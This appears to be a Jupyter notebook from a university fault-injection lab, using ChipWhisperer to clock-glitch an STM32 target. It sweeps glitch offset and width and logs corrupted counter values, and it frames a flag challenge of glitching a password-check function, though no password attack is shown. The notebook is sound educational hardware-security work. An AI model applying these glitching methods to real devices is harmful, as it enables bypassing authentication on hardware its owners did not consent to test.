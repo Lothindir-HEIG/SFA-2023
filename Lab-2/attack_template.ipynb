{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "id": "9d1ce393-313b-4f31-8cfb-4d14f7faf7d7",
   "metadata": {},
   "source": [
    "# FA3/FA4 - Fault injection on real target\n",
    "\n",
    "With this exercise, you will practice fault injeciton on a real target.\n",
    "\n",
    "# Challenge\n",
    "\n",
    "### Characterization\n",
    "\n",
    "To characterize the best parameters, you will have to glitch a simple function which counts up to 2500. If the right parameters are set, the device should reply with a value different than that.\n",
    "\n",
    "### Attack\n",
    "\n",
    "Once the good parameters are found, the next step is to attack the password checking function (same as simulated exercises). \n",
    "Again, there are two flags to find :\n",
    "\n",
    " * One flag is displayed if the passwortd checking function returns 1\n",
    " * The other flag is the correct password\n",
    "\n",
    "## Chipwhipserer glitch parameters\n",
    "\n",
    "Lots of parameters can be tweaked to find the *sweet spot* where the device glitches but resumes execution. Most of the parameters are already fixed, but the remaining ones depend on your target.\n",
    "\n",
    "![](Images/cwlitepro_glitch.webp)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "dca27d61-362e-4524-a965-d32443926fd9",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "#Imports\n",
    "\n",
    "import chipwhisperer as cw\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "import seaborn as sns\n",
    "import time\n",
    "import glob\n",
    "import matplotlib.pyplot as plt\n",
    "from tqdm.auto import tqdm, trange\n",
    "\n",
    "# Telegram messaging imports\n",
    "# import os\n",
    "# import requests\n",
    "# from tqdm.contrib.telegram import tqdm as telegram_tqdm\n",
    "# %reload_ext dotenv\n",
    "# %dotenv"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "a4840721-fe0f-4cdb-8193-354d9d8e8d3d",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Chipwhisperer basic configuration\n",
    "\n",
    "scope = cw.scope()\n",
    "target = cw.target(scope, cw.targets.SimpleSerial2)\n",
    "prog = cw.programmers.STM32FProgrammer\n",
    "scope.default_setup()\n",
    "# Get chipwhisperer temperature\n",
    "\n",
    "\n",
    "#Chipwhisperer clock is fed to the target chip\n",
    "scope.clock.clkgen_freq = 24E6\n",
    "target.baud = 230400*24/7.37\n",
    "\n",
    "cw.set_all_log_levels(cw.logging.CRITICAL)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "657eee5c-a0f2-422a-9d8e-2174963b027e",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "#Helper functions\n",
    "\n",
    "def target_reset():\n",
    "    scope.io.nrst = 'low'\n",
    "    time.sleep(0.05)\n",
    "    scope.io.nrst = 'high_z'\n",
    "    time.sleep(0.05)\n",
    "    target.flush()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "f23c6d39-2d33-455e-9bac-b2be0905caf4",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'valid': True, 'payload': CWbytearray(b'c4 09 00 00'), 'full_response': CWbytearray(b'00 72 04 c4 09 00 00 15 00'), 'rv': bytearray(b'\\x00')}\n"
     ]
    }
   ],
   "source": [
    "#Test that everything goes well by sending the loop command and check its output\n",
    "\n",
    "target_reset()\n",
    "scope.arm()\n",
    "target.simpleserial_write(\"g\", bytearray([]))\n",
    "scope.capture()\n",
    "val = target.simpleserial_read_witherrors('r', 4, glitch_timeout=10)#For loop check\n",
    "valid = val['valid']\n",
    "if valid:\n",
    "    response = val['payload']\n",
    "    raw_serial = val['full_response']\n",
    "    error_code = val['rv']\n",
    "\n",
    "print(val)\n",
    "# Should print\n",
    "# {'valid': True, 'payload': CWbytearray(b'c4 09 00 00'), 'full_response': CWbytearray(b'00 72 04 c4 09 00 00 15 00'), 'rv': bytearray(b'\\x00')}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "31d1f7d2-26be-4493-b898-cd21cf57d202",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "#Basic glitch settings\n",
    "\n",
    "scope.glitch.clk_src = \"clkgen\" # glitch counters use the main clock (24MHz)\n",
    "scope.glitch.output = \"glitch_only\" # Glitch output signal\n",
    "scope.glitch.trigger_src = \"ext_single\" # glitch only after scope.arm() called\n",
    "scope.io.glitch_lp = True # Enable low power MOSFET\n",
    "scope.io.glitch_hp = True # Enable high power MOSFET\n",
    "scope.glitch.repeat = 7 # Number of successive glitches, 7 should be OK for our target"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "d55ba0ee",
   "metadata": {},
   "outputs": [],
   "source": [
    "def escape_message(message: str):\n",
    "    for c in message:\n",
    "        if c in ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']:\n",
    "            message = message.replace(c, '\\\\' + c)\n",
    "    return message\n",
    "\n",
    "def send_telegram_message(message: str, to_group: bool = False):\n",
    "    req = requests.post(\n",
    "        url='https://api.telegram.org/bot{}/sendMessage'.format(os.getenv(\"TELEGRAM_BOT_TOKEN\")),\n",
    "        data={'chat_id': (os.getenv(\"TELEGRAM_GROUP_CHAT_ID\") if to_group else os.getenv(\"TELEGRAM_CHAT_ID\")), 'parse_mode': 'MarkdownV2', 'text': escape_message(message)}\n",
    "    ).json()\n",
    "    return 'OK' if req.get('ok', False) == True else req"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "70c63476-dcd1-41e3-86f7-fec8323e8c5b",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Characterization loop\n",
    "\n",
    "# Thic block will iterate over some of the glitch parameters to locate the \"sweet spot\"\n",
    "# where the glitches produce an effect\n",
    "\n",
    "# Change this block accordingly in order to find the parameters that produce\n",
    "# the maximum amount of glitches before going further the template\n",
    "\n",
    "# ext_offset is the number of clock cycles after the trigger\n",
    "\n",
    "def characterize_chip(offset_min: float, offset_max: float, offset_step: float, width_min: float, width_max: float, width_step: float, save_to_file: bool = False, show_progress: bool = True, send_telegram: bool = False, send_telegram_group: bool = False):\n",
    "  df = pd.DataFrame(columns=['offset','width', 'count'])\n",
    "\n",
    "  offsets = np.arange(offset_min, offset_max, offset_step)\n",
    "  widths = np.arange(width_min, width_max, width_step)\n",
    "\n",
    "  for ext_offset in range(1,2):\n",
    "      scope.glitch.ext_offset = ext_offset\n",
    "      \n",
    "      # offset is the percentage into the clock cycle where the glitch starts\n",
    "      if send_telegram:\n",
    "        progress_offsets = telegram_tqdm(offsets, desc=\"Offset\", position=0, disable=not show_progress, token=os.getenv(\"TELEGRAM_BOT_TOKEN\"), chat_id=(os.getenv(\"TELEGRAM_GROUP_CHAT_ID\") if send_telegram_group else os.getenv(\"TELEGRAM_CHAT_ID\")))\n",
    "      else:\n",
    "        progress_offsets = tqdm(offsets, desc=\"Offset\", position=0, disable=not show_progress)\n",
    "\n",
    "      for offset in progress_offsets:\n",
    "          scope.glitch.offset = offset\n",
    "          # progress_offsets.set_description(f\"Offset {offset:0.2f}\")\n",
    "          \n",
    "\n",
    "          # Width is the percentage of the period to glitch\n",
    "          try:\n",
    "            progress_widths = tqdm(widths, desc=\"Width\", position=1, leave=False, disable=not show_progress)\n",
    "            for width in progress_widths:\n",
    "                scope.glitch.width = width\n",
    "                # progress_widths.set_description(f\"Width {width:0.2f}\")\n",
    "                \n",
    "                # Repeat each iteration 5 times to ensure we get consistant results\n",
    "                count = 0\n",
    "                for _ in range(5):\n",
    "                    \n",
    "                    #Fun starts here\n",
    "                    target_reset()\n",
    "                    scope.arm()\n",
    "                    target.simpleserial_write(\"g\", bytearray([]))\n",
    "                    ret = scope.capture()\n",
    "                    #scope.io.vglitch_reset()\n",
    "                    \n",
    "                    # read response from target\n",
    "                    val = target.simpleserial_read_witherrors('r', 4, glitch_timeout=10, timeout=30)\n",
    "                    \n",
    "                    # If no response from the chip, assume it crashed\n",
    "                    if val['valid'] is False:\n",
    "                        # print(\"X\", end=\"\")\n",
    "                        continue\n",
    "                    \n",
    "                    # if counter is different thant the correct value, print the results\n",
    "                    counter = int.from_bytes(val['payload'], byteorder='little')\n",
    "                    if counter != 2500:\n",
    "                        count += 1\n",
    "                        # print(f\"*{counter:08d}*\", end=\"\")\n",
    "                        \n",
    "                    # else:\n",
    "                        # print(\".\", end=\"\")\n",
    "                if count > 0:\n",
    "                    # print()\n",
    "                    # print(f\"Count {count:02d}\\text_offset {ext_offset:02d}\\tWidth {width:0.2f}\\tOffset {offset:0.2f}\")\n",
    "                    df.loc[len(df.index)] = [offset, width, count]\n",
    "            if save_to_file and not df.empty:\n",
    "              if send_telegram:\n",
    "                send_telegram_message(f\"Offset {offset}\\n{len(df.index)} lines written to file\", to_group=send_telegram_group)\n",
    "              df.to_csv(f\"data/offset_{offset}.csv\")\n",
    "              df = pd.DataFrame(columns=['offset','width', 'count'])\n",
    "          except Exception as e:\n",
    "            send_telegram_message(f\"Offset {offset} failed with error: \\n```{e}```\", to_group=send_telegram_group)\n",
    "  return df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "6b8825be",
   "metadata": {},
   "outputs": [],
   "source": [
    "# target_reset()\n",
    "\n",
    "# characterize_chip(-40.0, 40.0, 1.0, 10.0, 40.0, 1.0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "1435afce",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "      offset  width  count\n",
      "0        9.1   31.7    1.0\n",
      "1        9.1   32.0    1.0\n",
      "2      -35.2   35.5    1.0\n",
      "3      -35.2   36.1    1.0\n",
      "4      -35.2   37.3    1.0\n",
      "...      ...    ...    ...\n",
      "3362   -19.6   35.6    5.0\n",
      "3363   -19.6   35.7    5.0\n",
      "3364   -19.6   35.8    3.0\n",
      "3365   -19.6   35.9    1.0\n",
      "3366   -19.6   36.1    2.0\n",
      "\n",
      "[3367 rows x 3 columns]\n"
     ]
    }
   ],
   "source": [
    "# Load all result files\n",
    "res_files = glob.iglob(\"data/[!merged]*.csv\")\n",
    "merged_data = pd.DataFrame(columns=['offset','width', 'count'])\n",
    "merged_data = pd.concat(map(pd.read_csv, res_files), ignore_index= True).drop(columns=['Unnamed: 0'])\n",
    "merged_data = merged_data.round(2)\n",
    "merged_data.to_csv(\"data/merged.csv\")\n",
    "print(merged_data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "8e6be5d2",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Select a subset of the merged data\n",
    "merged_data = merged_data[(merged_data['offset'] <= -10.0) & (merged_data['offset'] >= -33.0) & (merged_data['width'] >= 35.0) & (merged_data['width'] <= 37.2)]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "7130ed91",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Axes: xlabel='width', ylabel='offset'>"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 2 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "sns.heatmap(merged_data.pivot(index=\"offset\", columns=\"width\", values=\"count\"), annot=False, fmt=\"g\", cmap=\"YlGnBu\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "fcb91cdd",
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_info_on_glitch(offset_range, width_range):\n",
    "    total_tries = len(offset_range) * len(width_range) * 5\n",
    "    success = 0\n",
    "    progress_offsets = tqdm(offset_range, desc=\"Offset\")\n",
    "    progress_widths = tqdm(width_range, desc=\"Width\", position=1, leave=False)\n",
    "    for offset in progress_offsets:\n",
    "        scope.glitch.offset = offset\n",
    "        for width in progress_widths:\n",
    "            scope.glitch.width = width\n",
    "\n",
    "            # Repeat each iteration 5 times to ensure we get consistant results\n",
    "            count = 0\n",
    "            for _ in range(5):\n",
    "                #Fun starts here\n",
    "                target_reset()\n",
    "                scope.arm()\n",
    "                target.simpleserial_write(\"g\", bytearray([]))\n",
    "                ret = scope.capture()\n",
    "                \n",
    "                # read response from target\n",
    "                val = target.simpleserial_read_witherrors('r', 4, glitch_timeout=10, timeout=30)\n",
    "                \n",
    "                # If no response from the chip, assume it crashed\n",
    "                if val['valid'] is False:\n",
    "                    continue\n",
    "                \n",
    "                # if counter is different thant the correct value, print the results\n",
    "                counter = int.from_bytes(val['payload'], byteorder='little')\n",
    "                if counter != 2500:\n",
    "                    count += 1\n",
    "                    print(f\"*{counter:08d}*\", end=\"\")\n",
    "            success += count\n",
    "\n",
    "        print()\n",
    "        progress_widths.reset()\n",
    "    print(f\"Success rate: {success}/{total_tries} ({success/total_tries*100:.2f}%)\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "cf525117",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f2a282606fd54e298ea01a7f800cdf73",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Offset:   0%|          | 0/45 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e4af956a2bb540c8acd9ad53baa33c91",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Width:   0%|          | 0/3 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002501**00002499**00002499**00002499**00002499**00002501*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002501**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "Success rate: 666/135 (493.33%)\n"
     ]
    }
   ],
   "source": [
    "offsets = np.arange(-18.4, -13.9, 0.1)\n",
    "widths = np.arange(35.0, 35.3, 0.1)\n",
    "get_info_on_glitch(offsets, widths)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "7e5a36c9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d78a5c06ec02465a8723bd7507aa224a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Offset:   0%|          | 0/45 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7f77617f4abd4349aff988c5e246dd10",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Width:   0%|          | 0/5 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "*00002501**00002499**00002501**00002499**00002499**00002499**00002501**00002499*\n",
      "*00002499**00002501**00002499**00002501**00002499**00002499*\n",
      "*00002499**00002501**00002499**00002501**00002501**00002499**00002499**00002501**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002501**00002501**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002501**00002499**00002501**00002501**00002499**00002501*\n",
      "*00002501**00002501**00002499**00002499**00002501**00002501**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002501**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002501**00002499*\n",
      "*00002499**00002499**00002499**00002501**00002499**00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002501**00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002501**00002499**00002499**00002499**00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002501**00002499**00002499**00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002501**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002501**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002501**00002499**00002499**00002499**00002499**00002501**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002501**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002501**00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "Success rate: 806/1125 (71.64%)\n"
     ]
    }
   ],
   "source": [
    "offsets = np.arange(-23.8, -19.3, 0.1)\n",
    "widths = np.arange(35.3, 35.8, 0.1)\n",
    "get_info_on_glitch(offsets, widths)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "d740202f",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "eb4d5c4b0eae4239834be909682c303c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Offset:   0%|          | 0/45 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "89d88b45dcf84fe189c608d1026b9db3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Width:   0%|          | 0/5 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "*00002499**00002501**00002499**00002501**00002501**00002501**00002499**00002499**00002501**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002501**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002501**00002499**00002499**00002501*\n",
      "*00002499**00002499**00002499**00002501**00002499**00002499**00002501**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002501**00002499**00002501**00002501**00002499**00002499**00002499**00002501**00002499**00002499**00002499**00002499**00002501*\n",
      "*00002501**00002499**00002501**00002501**00002501**00002501**00002501**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002501**00002499*\n",
      "*00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499**00002499*\n",
